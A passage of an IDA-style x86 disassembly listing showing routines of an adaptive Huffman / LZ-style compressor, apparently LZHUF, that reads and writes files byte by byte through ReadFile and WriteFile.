                sub     ecx, edx
                shl     edi, cl
                mov     [esi+837Ah], di
                pop     edi
                retn
; ---------------------------------------------------------------------------

loc_40C93C:                             ; CODE XREF: sub_40C8C0+45↑j
                shl     word ptr [esi+837Ah], 8
                inc     dword ptr [esi+4]

loc_40C947:                             ; CODE XREF: sub_40C8C0+21↑j
                                        ; sub_40C8C0+35↑j ...
                pop     edi
                retn
sub_40C8C0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40C950      proc near               ; CODE XREF: sub_40CD50+11D↓p
                                        ; sub_40D3F0+92↓p
                push    ebx
                push    esi
                xor     eax, eax
                lea     ecx, [edx+7E90h]
                push    edi
                jmp     short loc_40C960
; ---------------------------------------------------------------------------
                align 10h

loc_40C960:                             ; CODE XREF: sub_40C950+B↑j
                                        ; sub_40C950+38↓j
                mov     esi, 1
                mov     [ecx-0C42h], si
                lea     esi, [eax+273h]
                mov     [ecx], si
                mov     [ecx-274h], ax
                inc     eax
                mov     esi, 13Ah
                add     ecx, 2
                cmp     ax, si
                jl      short loc_40C960
                xor     esi, esi
                mov     ecx, 13Ah
                lea     edi, [edx+8104h]
                jmp     short loc_40C9A0
; ---------------------------------------------------------------------------
                align 10h

loc_40C9A0:                             ; CODE XREF: sub_40C950+47↑j
                                        ; sub_40C950+8C↓j
                movsx   eax, si
                mov     bx, [edx+eax*2+7250h]
                add     bx, [edx+eax*2+724Eh]
                mov     [edi], si
                mov     [edi-0C42h], bx
                mov     [edx+eax*2+7738h], cx
                mov     [edx+eax*2+7736h], cx
                inc     ecx
                mov     eax, 272h
                add     esi, 2
                add     edi, 2
                cmp     cx, ax
                jle     short loc_40C9A0
                pop     edi
                mov     ecx, 0FFFFh
                xor     eax, eax
                pop     esi
                mov     [edx+7734h], cx
                mov     [edx+7C1Ah], ax
                pop     ebx
                retn
sub_40C950      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40CA00      proc near               ; CODE XREF: sub_40CB70+14↓p

var_8           = dword ptr -8
var_4           = dword ptr -4

                sub     esp, 8
                push    ebx
                push    ebp
                push    edi
                xor     ebx, ebx
                lea     ecx, [esi+7E90h]
                mov     ebp, 273h

loc_40CA13:                             ; CODE XREF: sub_40CA00+47↓j
                mov     eax, 273h
                cmp     [ecx], ax
                jl      short loc_40CA41
                movzx   eax, word ptr [ecx-0C42h]
                inc     eax
                cdq
                movsx   edi, bx
                sub     eax, edx
                sar     eax, 1
                mov     [esi+edi*2+724Eh], ax
                mov     dx, [ecx]
                mov     [esi+edi*2+7E90h], dx
                inc     ebx

loc_40CA41:                             ; CODE XREF: sub_40CA00+1B↑j
                add     ecx, 2
                sub     ebp, 1
                jnz     short loc_40CA13
                xor     eax, eax
                mov     [esp+14h+var_8], eax
                mov     ebx, 13Ah
                jmp     short loc_40CA5A
; ---------------------------------------------------------------------------

loc_40CA56:                             ; CODE XREF: sub_40CA00+119↓j
                mov     eax, [esp+14h+var_8]

loc_40CA5A:                             ; CODE XREF: sub_40CA00+54↑j
                lea     ecx, [eax+1]
                movsx   edx, cx
                movsx   ecx, ax
                mov     ax, [esi+edx*2+724Eh]
                add     ax, [esi+ecx*2+724Eh]
                movsx   edx, bx
                mov     [esi+edx*2+724Eh], ax
                movzx   edx, ax
                lea     ecx, [ebx-1]
                movzx   eax, cx
                movsx   ecx, cx
                mov     [esp+14h+var_4], edx
                cmp     dx, [esi+ecx*2+724Eh]
                jnb     short loc_40CAAE
                jmp     short loc_40CAA0
; ---------------------------------------------------------------------------
                align 10h

loc_40CAA0:                             ; CODE XREF: sub_40CA00+98↑j
                                        ; sub_40CA00+AC↓j
                dec     eax
                movsx   ecx, ax
                cmp     dx, [esi+ecx*2+724Eh]
                jb      short loc_40CAA0

loc_40CAAE:                             ; CODE XREF: sub_40CA00+96↑j
                inc     eax
                mov     edx, ebx
                sub     edx, eax
                add     edx, edx
                movzx   ecx, dx
                movsx   edi, ax
                movzx   ebp, cx
                lea     eax, [esi+edi*2+724Eh]
                push    ebp
                push    eax
                lea     eax, [esi+edi*2+7250h]
                push    eax
                call    sub_40F9F0
                mov     cx, word ptr [esp+20h+var_4]
                lea     eax, [esi+edi*2+7E90h]
                push    ebp
                push    eax
                lea     edx, [esi+edi*2+7E92h]
                push    edx
                mov     [esi+edi*2+724Eh], cx
                mov     [esp+2Ch+var_4], eax
                call    sub_40F9F0
                mov     eax, [esp+2Ch+var_8]
                mov     ecx, [esp+2Ch+var_4]
                mov     [ecx], ax
                add     eax, 2
                inc     ebx
                mov     edx, 273h
                add     esp, 18h
                cmp     bx, dx
                mov     [esp+14h+var_8], eax
                jl      loc_40CA56
                xor     eax, eax
                lea     edx, [esi+7E90h]
                jmp     short loc_40CB30
; ---------------------------------------------------------------------------
                align 10h

loc_40CB30:                             ; CODE XREF: sub_40CA00+127↑j
                                        ; sub_40CA00+159↓j
                movzx   ecx, word ptr [edx]
                mov     edi, 273h
                cmp     cx, di
                movsx   ecx, cx
                mov     [esi+ecx*2+7736h], ax
                jge     short loc_40CB50
                mov     [esi+ecx*2+7738h], ax

loc_40CB50:                             ; CODE XREF: sub_40CA00+146↑j
                inc     eax
                mov     ecx, edi
                add     edx, 2
                cmp     ax, cx
                jl      short loc_40CB30
                pop     edi
                pop     ebp
                pop     ebx
                add     esp, 8
                retn
sub_40CA00      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40CB70      proc near               ; CODE XREF: sub_40CC80+5C↓p
                                        ; sub_40CCF0+50↓p

arg_0           = word ptr  4

                push    ebx
                push    ebp
                push    esi
                mov     esi, eax
                mov     eax, 8000h
                push    edi
                cmp     [esi+7732h], ax
                jnz     short loc_40CB89
                call    sub_40CA00

loc_40CB89:                             ; CODE XREF: sub_40CB70+12↑j
                movsx   ecx, [esp+10h+arg_0]
                movzx   ebx, word ptr [esi+ecx*2+7C1Ch]
                jmp     short loc_40CBA0
; ---------------------------------------------------------------------------
                align 10h

loc_40CBA0:                             ; CODE XREF: sub_40CB70+26↑j
                                        ; sub_40CB70+F8↓j
                movsx   ecx, bx
                inc     word ptr [esi+ecx*2+724Eh]
                movzx   eax, word ptr [esi+ecx*2+724Eh]
                lea     edx, [ebx+1]
                movzx   edi, ax
                movzx   eax, dx
                movsx   edx, ax
                cmp     di, [esi+edx*2+724Eh]
                jbe     loc_40CC5A
                lea     ecx, [ecx+0]

loc_40CBD0:                             ; CODE XREF: sub_40CB70+6C↓j
                inc     eax
                movsx   edx, ax
                cmp     di, [esi+edx*2+724Eh]
                ja      short loc_40CBD0
                dec     eax
                movsx   edx, ax
                mov     bp, [esi+edx*2+724Eh]
                mov     [esi+ecx*2+724Eh], bp
                mov     [esi+edx*2+724Eh], di
                movzx   edi, word ptr [esi+ecx*2+7E90h]
                movsx   ebp, di
                mov     [esi+ebp*2+7736h], ax
                mov     ebp, 273h
                cmp     di, bp
                jge     short loc_40CC22
                movsx   ebp, di
                mov     [esi+ebp*2+7738h], ax

loc_40CC22:                             ; CODE XREF: sub_40CB70+A5↑j
                movzx   ebp, word ptr [esi+edx*2+7E90h]
                mov     [esi+edx*2+7E90h], di
                movsx   edx, bp
                mov     edi, 273h
                cmp     bp, di
                mov     [esi+edx*2+7736h], bx
                jge     short loc_40CC4F
                mov     [esi+edx*2+7738h], bx

loc_40CC4F:                             ; CODE XREF: sub_40CB70+D5↑j
                mov     [esi+ecx*2+7E90h], bp
                movzx   ebx, ax

loc_40CC5A:                             ; CODE XREF: sub_40CB70+57↑j
                movsx   eax, bx
                movzx   ebx, word ptr [esi+eax*2+7736h]
                test    bx, bx
                jnz     loc_40CBA0
                pop     edi
                pop     esi
                pop     ebp
                pop     ebx
                retn    4
sub_40CB70      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40CC80      proc near               ; CODE XREF: sub_40CD50+28A↓p
                                        ; sub_40CD50+29C↓p

var_4           = dword ptr -4

                push    ecx
                push    ebx
                push    esi
                mov     esi, eax
                movzx   eax, di
                movzx   eax, word ptr [esi+eax*2+7C1Ch]
                xor     ebx, ebx
                mov     [esp+0Ch+var_4], ebx

loc_40CC96:                             ; CODE XREF: sub_40CC80+3B↓j
                shr     word ptr [esp+0Ch+var_4], 1
                test    al, 1
                jz      short loc_40CCA7
                add     [esp+0Ch+var_4], 8000h

loc_40CCA7:                             ; CODE XREF: sub_40CC80+1D↑j
                movsx   ecx, ax
                movzx   eax, word ptr [esi+ecx*2+7736h]
                mov     edx, 272h
                inc     ebx
                cmp     ax, dx
                jnz     short loc_40CC96
                mov     eax, [esp+0Ch+var_4]
                call    sub_40C8C0
                mov     ax, word ptr [esp+0Ch+var_4]
                mov     [esi+837Eh], ax
                push    edi
                mov     eax, esi
                mov     [esi+8380h], bx
                call    sub_40CB70
                pop     esi
                pop     ebx
                pop     ecx
                retn
sub_40CC80      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40CCF0      proc near               ; CODE XREF: sub_40D3F0+C2↓p

var_4           = dword ptr -4

                push    ecx
                push    esi
                mov     esi, eax
                movzx   eax, word ptr [esi+8374h]
                push    edi
                mov     ecx, 273h
                mov     di, ax
                mov     [esp+0Ch+var_4], eax
                cmp     di, cx
                jnb     short loc_40CD34
                lea     ecx, [ecx+0]

loc_40CD10:                             ; CODE XREF: sub_40CCF0+42↓j
                call    sub_40C6C0
                add     di, ax
                movzx   edx, di
                movzx   eax, word ptr [esi+edx*2+7E90h]
                mov     ecx, 273h
                mov     di, ax
                mov     [esp+0Ch+var_4], eax
                cmp     di, cx
                jb      short loc_40CD10

loc_40CD34:                             ; CODE XREF: sub_40CCF0+1B↑j
                add     eax, 0FD8Dh
                mov     [esp+0Ch+var_4], eax
                push    eax
                mov     eax, esi
                call    sub_40CB70
                mov     ax, word ptr [esp+0Ch+var_4]
                pop     edi
                pop     esi
                pop     ecx
                retn
sub_40CCF0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40CD50      proc near               ; CODE XREF: sub_40D7F0+62↓p

var_28          = dword ptr -28h
var_24          = dword ptr -24h
var_20          = dword ptr -20h
Buffer          = dword ptr -1Ch
NumberOfBytesRead= dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
NumberOfBytesWritten= dword ptr -4

                sub     esp, 28h
                push    ebp
                push    esi
                mov     esi, eax
                movzx   eax, byte ptr [esi]
                xor     ebp, ebp
                mov     [esp+30h+Buffer], eax
                mov     eax, [esi+83A8h]
                mov     [esi+4], ebp
                cmp     eax, ebp
                jnz     short loc_40CD8D
                mov     eax, [esi+8388h]
                push    ebp             ; lpOverlapped
                lea     ecx, [esp+34h+NumberOfBytesWritten]
                push    ecx             ; lpNumberOfBytesWritten
                push    1               ; nNumberOfBytesToWrite
                lea     edx, [esp+3Ch+Buffer]
                push    edx             ; lpBuffer
                push    eax             ; hFile
                mov     [esp+44h+NumberOfBytesWritten], ebp
                call    ds:WriteFile
                jmp     short loc_40CD9C
; ---------------------------------------------------------------------------

loc_40CD8D:                             ; CODE XREF: sub_40CD50+1B↑j
                cmp     eax, 1
                jnz     short loc_40CD9C
                lea     ecx, [esp+30h+Buffer]
                push    ecx
                call    sub_40D640

loc_40CD9C:                             ; CODE XREF: sub_40CD50+3B↑j
                                        ; sub_40CD50+40↑j
                movzx   edx, byte ptr [esi+1]
                mov     eax, [esi+83A8h]
                mov     [esp+30h+Buffer], edx
                cmp     eax, ebp
                jnz     short loc_40CDCE
                mov     edx, [esi+8388h]
                push    ebp             ; lpOverlapped
                lea     eax, [esp+34h+NumberOfBytesWritten]
                push    eax             ; lpNumberOfBytesWritten
                push    1               ; nNumberOfBytesToWrite
                lea     ecx, [esp+3Ch+Buffer]
                push    ecx             ; lpBuffer
                push    edx             ; hFile
                mov     [esp+44h+NumberOfBytesWritten], ebp
                call    ds:WriteFile
                jmp     short loc_40CDDD
; ---------------------------------------------------------------------------

loc_40CDCE:                             ; CODE XREF: sub_40CD50+5C↑j
                cmp     eax, 1
                jnz     short loc_40CDDD
                lea     eax, [esp+30h+Buffer]
                push    eax
                call    sub_40D640

loc_40CDDD:                             ; CODE XREF: sub_40CD50+7C↑j
                                        ; sub_40CD50+81↑j
                movzx   ecx, byte ptr [esi+2]
                mov     eax, [esi+83A8h]
                mov     [esp+30h+Buffer], ecx
                cmp     eax, ebp
                jnz     short loc_40CE0F
                mov     ecx, [esi+8388h]
                push    ebp             ; lpOverlapped
                lea     edx, [esp+34h+NumberOfBytesWritten]
                push    edx             ; lpNumberOfBytesWritten
                push    1               ; nNumberOfBytesToWrite
                lea     eax, [esp+3Ch+Buffer]
                push    eax             ; lpBuffer
                push    ecx             ; hFile
                mov     [esp+44h+NumberOfBytesWritten], ebp
                call    ds:WriteFile
                jmp     short loc_40CE1E
; ---------------------------------------------------------------------------

loc_40CE0F:                             ; CODE XREF: sub_40CD50+9D↑j
                cmp     eax, 1
                jnz     short loc_40CE1E
                lea     edx, [esp+30h+Buffer]
                push    edx
                call    sub_40D640

loc_40CE1E:                             ; CODE XREF: sub_40CD50+BD↑j
                                        ; sub_40CD50+C2↑j
                movzx   eax, byte ptr [esi+3]
                mov     [esp+30h+Buffer], eax
                mov     eax, [esi+83A8h]
                cmp     eax, ebp
                jnz     short loc_40CE50
                mov     eax, [esi+8388h]
                push    ebp             ; lpOverlapped
                lea     ecx, [esp+34h+NumberOfBytesWritten]
                push    ecx             ; lpNumberOfBytesWritten
                push    1               ; nNumberOfBytesToWrite
                lea     edx, [esp+3Ch+Buffer]
                push    edx             ; lpBuffer
                push    eax             ; hFile
                mov     [esp+44h+NumberOfBytesWritten], ebp
                call    ds:WriteFile
                jmp     short loc_40CE5F
; ---------------------------------------------------------------------------

loc_40CE50:                             ; CODE XREF: sub_40CD50+DE↑j
                cmp     eax, 1
                jnz     short loc_40CE5F
                lea     ecx, [esp+30h+Buffer]
                push    ecx
                call    sub_40D640

loc_40CE5F:                             ; CODE XREF: sub_40CD50+FE↑j
                                        ; sub_40CD50+103↑j
                cmp     [esi], ebp
                jz      loc_40D3E7
                push    ebx
                push    edi
                mov     edx, esi
                mov     [esi], ebp
                call    sub_40C950
                mov     eax, 1000h
                movzx   edx, ax
                mov     eax, edx
                shl     edx, 10h
                or      eax, edx
                lea     edi, [esi+504Ch]
                mov     ecx, 80h
                rep stosd
                mov     eax, 1000h
                movzx   edx, ax
                mov     eax, edx
                shl     edx, 10h
                or      eax, edx
                lea     edi, [esi+524Ch]
                mov     ecx, 800h
                push    0FC4h
                rep stosd
                lea     eax, [esi+8]
                push    20h
                push    eax
                mov     [esp+44h+var_28], ebp
                mov     [esp+44h+var_20], 0FC4h
                call    sub_413520
                add     esp, 0Ch
                xor     edi, edi
                mov     [esp+38h+var_24], edi
                nop

loc_40CED0:                             ; CODE XREF: sub_40CD50+217↓j
                mov     eax, [esi+83A8h]
                xor     ecx, ecx
                mov     [esp+38h+Buffer], ecx
                cmp     eax, ecx
                jnz     short loc_40CF04
                mov     edx, [esi+8384h]
                push    ecx             ; lpOverlapped
                lea     eax, [esp+3Ch+NumberOfBytesRead]
                push    eax             ; lpNumberOfBytesRead
                mov     [esp+40h+NumberOfBytesRead], ecx
                push    1               ; nNumberOfBytesToRead
                lea     ecx, [esp+44h+Buffer]
                push    ecx             ; lpBuffer
                push    edx             ; hFile
                call    ds:ReadFile
                mov     ebx, [esp+38h+NumberOfBytesRead]
                jmp     short loc_40CF45
; ---------------------------------------------------------------------------

loc_40CF04:                             ; CODE XREF: sub_40CD50+18E↑j
                cmp     eax, 1
                jnz     short loc_40CF6D
                mov     edi, [esi+83A0h]
                mov     ebx, eax
                mov     eax, [esi+8394h]
                lea     ecx, [edi+1]
                cmp     ecx, eax
                jle     short loc_40CF22
                sub     eax, edi
                mov     ebx, eax

loc_40CF22:                             ; CODE XREF: sub_40CD50+1CC↑j
                mov     edx, [esi+838Ch]
                push    ebx
                add     edx, edi
                push    edx
                lea     eax, [esp+40h+Buffer]
                push    eax
                call    sub_414550
                add     esp, 0Ch
                add     edi, ebx
                mov     [esi+83A0h], edi
                mov     edi, [esp+38h+var_24]

loc_40CF45:                             ; CODE XREF: sub_40CD50+1B2↑j
                cmp     ebx, 1
                jnz     short loc_40CF6D
                mov     eax, [esp+38h+Buffer]
                cmp     ax, 0FFFFh
                jz      short loc_40CF6D
                movsx   ecx, di
                inc     edi
                cmp     di, 3Ch
                mov     [ecx+esi+0FCCh], al
                mov     [esp+38h+var_24], edi
                jl      loc_40CED0

loc_40CF6D:                             ; CODE XREF: sub_40CD50+1B7↑j
                                        ; sub_40CD50+1F8↑j ...
                movsx   edx, di
                mov     [esi], edx
                mov     edi, 0FC3h

loc_40CF77:                             ; CODE XREF: sub_40CD50+238↓j
                push    edi
                mov     eax, esi
                call    sub_40C370
                dec     edi
                mov     eax, 0F88h
                cmp     di, ax
                jge     short loc_40CF77
                push    0FC4h
                mov     eax, esi
                call    sub_40C370
                jmp     short loc_40CFA0
; ---------------------------------------------------------------------------
                align 10h

loc_40CFA0:                             ; CODE XREF: sub_40CD50+246↑j
                                        ; sub_40CD50+636↓j
                mov     eax, [esp+38h+var_24]
                cmp     [esi+1046h], ax
                jle     short loc_40CFB4
                mov     [esi+1046h], ax

loc_40CFB4:                             ; CODE XREF: sub_40CD50+25B↑j
                movzx   eax, word ptr [esi+1046h]
                cmp     ax, 2
                jg      short loc_40CFE4
                movsx   edx, word ptr [esp+38h+var_20]
                mov     ecx, 1
                mov     [esi+1046h], cx
                movzx   di, byte ptr [edx+esi+8]
                mov     eax, esi
                call    sub_40CC80
                jmp     loc_40D235
; ---------------------------------------------------------------------------

loc_40CFE4:                             ; CODE XREF: sub_40CD50+26F↑j
                lea     edi, [eax+0FDh]
                mov     eax, esi
                call    sub_40CC80
                movzx   ebx, word ptr [esi+1044h]
                mov     ax, bx
                shr     ax, 6
                movzx   eax, ax
                movzx   cx, byte_4263C0[eax]
                movzx   dx, byte_426380[eax]
                mov     al, [esi+837Ch]
                shl     cx, 8
                movzx   edi, cx
                mov     ebp, edi
                mov     cl, al
                shr     bp, cl
                movzx   edx, dx
                or      [esi+837Ah], bp
                add     al, dl
                xor     ebp, ebp
                mov     [esp+38h+NumberOfBytesWritten], edx
                mov     [esi+837Ch], al
                cmp     al, 8
                jb      loc_40D126
                movzx   eax, byte ptr [esi+837Bh]
                mov     [esp+38h+Buffer], eax
                mov     eax, [esi+83A8h]
                cmp     eax, ebp
                jnz     short loc_40D07F
                mov     eax, [esi+8388h]
                push    ebp             ; lpOverlapped
                lea     ecx, [esp+3Ch+NumberOfBytesRead]
                push    ecx             ; lpNumberOfBytesWritten
                push    1               ; nNumberOfBytesToWrite
                lea     edx, [esp+44h+Buffer]
                push    edx             ; lpBuffer
                push    eax             ; hFile
                mov     [esp+4Ch+NumberOfBytesRead], ebp
                call    ds:WriteFile
                mov     eax, [esp+38h+NumberOfBytesRead]
                jmp     short loc_40D092
; ---------------------------------------------------------------------------

loc_40D07F:                             ; CODE XREF: sub_40CD50+309↑j
                cmp     eax, 1
                jnz     loc_40D126
                lea     ecx, [esp+38h+Buffer]
                push    ecx
                call    sub_40D640

loc_40D092:                             ; CODE XREF: sub_40CD50+32D↑j
                cmp     eax, 1
                jnz     loc_40D126
                add     byte ptr [esi+837Ch], 0F8h
                cmp     byte ptr [esi+837Ch], 8
                jb      short loc_40D11B
                movzx   edx, word ptr [esi+837Ah]
                mov     eax, [esi+83A8h]
                mov     [esp+38h+Buffer], edx
                cmp     eax, ebp
                jnz     short loc_40D0E4
                mov     edx, [esi+8388h]
                push    ebp             ; lpOverlapped
                lea     eax, [esp+3Ch+var_14]
                push    eax             ; lpNumberOfBytesWritten
                push    1               ; nNumberOfBytesToWrite
                lea     ecx, [esp+44h+Buffer]
                push    ecx             ; lpBuffer
                push    edx             ; hFile
                mov     [esp+4Ch+var_14], ebp
                call    ds:WriteFile
                mov     eax, [esp+38h+var_14]
                jmp     short loc_40D0F3
; ---------------------------------------------------------------------------

loc_40D0E4:                             ; CODE XREF: sub_40CD50+36E↑j
                cmp     eax, 1
                jnz     short loc_40D126
                lea     eax, [esp+38h+Buffer]
                push    eax
                call    sub_40D640

loc_40D0F3:                             ; CODE XREF: sub_40CD50+392↑j
                cmp     eax, 1
                jnz     short loc_40D126
                add     byte ptr [esi+837Ch], 0F8h
                movzx   edx, byte ptr [esi+837Ch]
                mov     ecx, [esp+38h+NumberOfBytesWritten]
                add     dword ptr [esi+4], 2
                sub     ecx, edx
                shl     edi, cl
                mov     [esi+837Ah], di
                jmp     short loc_40D126
; ---------------------------------------------------------------------------

loc_40D11B:                             ; CODE XREF: sub_40CD50+359↑j
                shl     word ptr [esi+837Ah], 8
                inc     dword ptr [esi+4]

loc_40D126:                             ; CODE XREF: sub_40CD50+2F0↑j
                                        ; sub_40CD50+332↑j ...
                mov     al, [esi+837Ch]
                shl     ebx, 0Ah
                movzx   edi, bx
                mov     cl, al
                mov     edx, edi
                shr     dx, cl
                add     al, 6
                mov     [esi+837Ch], al
                or      [esi+837Ah], dx
                cmp     al, 8
                jb      loc_40D231
                movzx   eax, byte ptr [esi+837Bh]
                mov     [esp+38h+Buffer], eax
                mov     eax, [esi+83A8h]
                cmp     eax, ebp
                jnz     short loc_40D189
                mov     eax, [esi+8388h]
                push    ebp             ; lpOverlapped
                lea     ecx, [esp+3Ch+var_10]
                push    ecx             ; lpNumberOfBytesWritten
                push    1               ; nNumberOfBytesToWrite
                lea     edx, [esp+44h+Buffer]
                push    edx             ; lpBuffer
                push    eax             ; hFile
                mov     [esp+4Ch+var_10], ebp
                call    ds:WriteFile
                mov     eax, [esp+38h+var_10]
                jmp     short loc_40D19C
; ---------------------------------------------------------------------------

loc_40D189:                             ; CODE XREF: sub_40CD50+413↑j
                cmp     eax, 1
                jnz     loc_40D231
                lea     ecx, [esp+38h+Buffer]
                push    ecx
                call    sub_40D640

loc_40D19C:                             ; CODE XREF: sub_40CD50+437↑j
                cmp     eax, 1
                jnz     loc_40D231
                add     byte ptr [esi+837Ch], 0F8h
                cmp     byte ptr [esi+837Ch], 8
                jb      short loc_40D226
                movzx   edx, word ptr [esi+837Ah]
                mov     eax, [esi+83A8h]
                mov     [esp+38h+Buffer], edx
                cmp     eax, ebp
                jnz     short loc_40D1EE
                mov     edx, [esi+8388h]
                push    ebp             ; lpOverlapped
                lea     eax, [esp+3Ch+var_C]
                push    eax             ; lpNumberOfBytesWritten
                push    1               ; nNumberOfBytesToWrite
                lea     ecx, [esp+44h+Buffer]
                push    ecx             ; lpBuffer
                push    edx             ; hFile
                mov     [esp+4Ch+var_C], ebp
                call    ds:WriteFile
                mov     eax, [esp+38h+var_C]
                jmp     short loc_40D1FD
; ---------------------------------------------------------------------------

loc_40D1EE:                             ; CODE XREF: sub_40CD50+478↑j
                cmp     eax, 1
                jnz     short loc_40D231
                lea     eax, [esp+38h+Buffer]
                push    eax
                call    sub_40D640

loc_40D1FD:                             ; CODE XREF: sub_40CD50+49C↑j
                cmp     eax, 1
                jnz     short loc_40D231
                add     byte ptr [esi+837Ch], 0F8h
                movzx   edx, byte ptr [esi+837Ch]
                add     dword ptr [esi+4], 2
                mov     ecx, 6
                sub     ecx, edx
                shl     edi, cl
                mov     [esi+837Ah], di
                jmp     short loc_40D231
; ---------------------------------------------------------------------------

loc_40D226:                             ; CODE XREF: sub_40CD50+463↑j
                shl     word ptr [esi+837Ah], 8
                inc     dword ptr [esi+4]

loc_40D231:                             ; CODE XREF: sub_40CD50+3FA↑j
                                        ; sub_40CD50+43C↑j ...
                mov     ebp, [esp+38h+var_28]

loc_40D235:                             ; CODE XREF: sub_40CD50+28F↑j
                movzx   ecx, word ptr [esi+1046h]
                xor     edi, edi
                xor     eax, eax
                cmp     ax, cx
                mov     [esp+38h+Buffer], ecx
                mov     [esp+38h+NumberOfBytesWritten], edi
                jge     loc_40D380

loc_40D251:                             ; CODE XREF: sub_40CD50+5D8↓j
                mov     eax, [esi+83A8h]
                xor     edx, edx
                mov     [esp+38h+var_28], edx
                cmp     eax, edx
                jnz     short loc_40D285
                mov     eax, [esi+8384h]
                push    edx             ; lpOverlapped
                lea     ecx, [esp+3Ch+var_8]
                push    ecx             ; lpNumberOfBytesRead
                mov     [esp+40h+var_8], edx
                push    1               ; nNumberOfBytesToRead
                lea     edx, [esp+44h+var_28]
                push    edx             ; lpBuffer
                push    eax             ; hFile
                call    ds:ReadFile
                mov     ebx, [esp+38h+var_8]
                jmp     short loc_40D2CA
; ---------------------------------------------------------------------------

loc_40D285:                             ; CODE XREF: sub_40CD50+50F↑j
                cmp     eax, 1
                jnz     loc_40D331
                mov     edi, [esi+83A0h]
                mov     ebx, eax
                mov     eax, [esi+8394h]
                lea     ecx, [edi+1]
                cmp     ecx, eax
                jle     short loc_40D2A7
                sub     eax, edi
                mov     ebx, eax

loc_40D2A7:                             ; CODE XREF: sub_40CD50+551↑j
                mov     edx, [esi+838Ch]
                push    ebx
                add     edx, edi
                push    edx
                lea     eax, [esp+40h+var_28]
                push    eax
                call    sub_414550
                add     esp, 0Ch
                add     edi, ebx
                mov     [esi+83A0h], edi
                mov     edi, [esp+38h+NumberOfBytesWritten]

loc_40D2CA:                             ; CODE XREF: sub_40CD50+533↑j
                cmp     ebx, 1
                jnz     short loc_40D32D
                cmp     word ptr [esp+38h+var_28], 0FFFFh
                jz      short loc_40D32D
                mov     ebx, ebp
                mov     eax, esi
                call    sub_40C580
                cmp     bp, 3Bh
                movsx   ecx, bp
                lea     eax, [ecx+esi]
                mov     cl, byte ptr [esp+38h+var_28]
                mov     [eax+8], cl
                jge     short loc_40D2F9
                mov     [eax+1008h], cl

loc_40D2F9:                             ; CODE XREF: sub_40CD50+5A1↑j
                mov     edx, [esp+38h+var_20]
                lea     eax, [edx+1]
                and     eax, 0FFFh
                push    eax
                inc     ebp
                mov     [esp+3Ch+var_20], eax
                mov     eax, esi
                and     ebp, 0FFFh
                call    sub_40C370
                inc     edi
                cmp     di, word ptr [esp+38h+Buffer]
                mov     [esp+38h+NumberOfBytesWritten], edi
                jge     short loc_40D37C
                mov     ecx, [esp+38h+Buffer]
                jmp     loc_40D251
; ---------------------------------------------------------------------------

loc_40D32D:                             ; CODE XREF: sub_40CD50+57D↑j
                                        ; sub_40CD50+585↑j
                mov     ecx, [esp+38h+Buffer]

loc_40D331:                             ; CODE XREF: sub_40CD50+538↑j
                cmp     di, cx
                mov     [esp+38h+var_28], ebp
                jge     short loc_40D380
                sub     ecx, edi
                movzx   edi, cx
                nop

loc_40D340:                             ; CODE XREF: sub_40CD50+62A↓j
                mov     ebx, ebp
                mov     eax, esi
                call    sub_40C580
                mov     eax, [esp+38h+var_20]
                lea     ecx, [eax+1]
                mov     eax, [esp+38h+var_24]
                inc     ebp
                dec     eax
                and     ecx, 0FFFh
                and     ebp, 0FFFh
                mov     [esp+38h+var_20], ecx
                mov     [esp+38h+var_24], eax
                test    ax, ax
                jz      short loc_40D377
                push    ecx
                mov     eax, esi
                call    sub_40C370

loc_40D377:                             ; CODE XREF: sub_40CD50+61D↑j
                sub     edi, 1
                jnz     short loc_40D340

loc_40D37C:                             ; CODE XREF: sub_40CD50+5D2↑j
                mov     [esp+38h+var_28], ebp

loc_40D380:                             ; CODE XREF: sub_40CD50+4FB↑j
                                        ; sub_40CD50+5E8↑j
                cmp     word ptr [esp+38h+var_24], 0
                jg      loc_40CFA0
                cmp     byte ptr [esi+837Ch], 0
                pop     edi
                pop     ebx
                jz      short loc_40D3E7
                movzx   ecx, byte ptr [esi+837Bh]
                mov     eax, [esi+83A8h]
                mov     [esp+30h+var_8], ecx
                test    eax, eax
                jnz     short loc_40D3D0
                mov     ecx, [esi+8388h]
                push    eax             ; lpOverlapped
                lea     edx, [esp+34h+NumberOfBytesWritten]
                push    edx             ; lpNumberOfBytesWritten
                mov     [esp+38h+NumberOfBytesWritten], eax
                push    1               ; nNumberOfBytesToWrite
                lea     eax, [esp+3Ch+var_8]
                push    eax             ; lpBuffer
                push    ecx             ; hFile
                call    ds:WriteFile
                mov     eax, [esp+30h+NumberOfBytesWritten]
                jmp     short loc_40D3DF
; ---------------------------------------------------------------------------

loc_40D3D0:                             ; CODE XREF: sub_40CD50+65A↑j
                cmp     eax, 1
                jnz     short loc_40D3E7
                lea     edx, [esp+30h+var_8]
                push    edx
                call    sub_40D640

loc_40D3DF:                             ; CODE XREF: sub_40CD50+67E↑j
                cmp     eax, 1
                jnz     short loc_40D3E7
                inc     dword ptr [esi+4]

loc_40D3E7:                             ; CODE XREF: sub_40CD50+111↑j
                                        ; sub_40CD50+645↑j ...
                pop     esi
                pop     ebp
                add     esp, 28h
                retn
sub_40CD50      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40D3F0      proc near               ; CODE XREF: sub_4052B0+F2↑p

var_18          = dword ptr -18h
NumberOfBytesWritten= dword ptr -14h
Buffer          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4

                sub     esp, 18h
                push    esi
                push    edi
                mov     esi, eax
                xor     edi, edi
                lea     edx, [esp+20h+var_18]
                mov     [esi+4], edi
                mov     [esp+20h+var_18], edi
                call    sub_40D720
                cmp     eax, 1
                jz      short loc_40D413
                or      eax, 0FFFFFFFFh
                jmp     short loc_40D417
; ---------------------------------------------------------------------------

loc_40D413:                             ; CODE XREF: sub_40D3F0+1C↑j
                mov     eax, [esp+20h+var_18]

loc_40D417:                             ; CODE XREF: sub_40D3F0+21↑j
